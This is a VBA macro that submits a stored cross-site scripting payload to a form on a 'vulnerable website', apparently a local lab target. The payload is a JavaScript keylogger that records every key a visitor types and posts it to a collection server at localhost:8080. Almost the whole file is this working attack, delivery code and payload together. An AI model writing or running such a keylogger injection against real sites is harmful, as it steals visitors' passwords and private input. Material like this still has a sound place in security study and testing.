Option Explicit

Sub SendMaliciousRequest()
    Dim http As Object
    Dim url As String
    Dim maliciousMessage As String
    Dim message As String
    Dim body As String
    
    ' Create an HTTP object to send the request
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' URL of the vulnerable website
    url = "http://localhost/root/php/development.php"
    
    ' Craft the XSS payload: an event listener for a keypress
    maliciousMessage = "<script>let userInput = ''; let timeoutId = null; const sendToServer = async (data) => { try { const response = await fetch('http://localhost:8080/keystroke', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ key: data }) }); if (!response.ok) { throw new Error('Network response was not ok'); } console.log('Now clearing userInput'); userInput = ''; } catch (error) { console.error('Error sending data:', error); } }; document.addEventListener('keydown', (event) => { console.log(`userInput before: ${userInput}`); userInput = `${userInput}${event.key}`; console.log(userInput); if (timeoutId) { clearTimeout(timeoutId); } timeoutId = setTimeout(() => { if (userInput.trim()) { sendToServer(userInput); } }, 3000); }); const cleanup = () => { if (timeoutId) { clearTimeout(timeoutId); } document.removeEventListener('keydown', listener); };</script>"
    
    ' Set up the form data to be submitted
    body = "message=" & maliciousMessage
    
    ' Send the POST request to the server
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send body

    ' Check for success
    If http.Status = 200 Then
        MsgBox "Malicious message sent successfully!", vbInformation
    Else
        MsgBox "Failed to send message. HTTP Status: " & http.Status, vbCritical
    End If
    
    ' Clean up
    Set http = Nothing
End Sub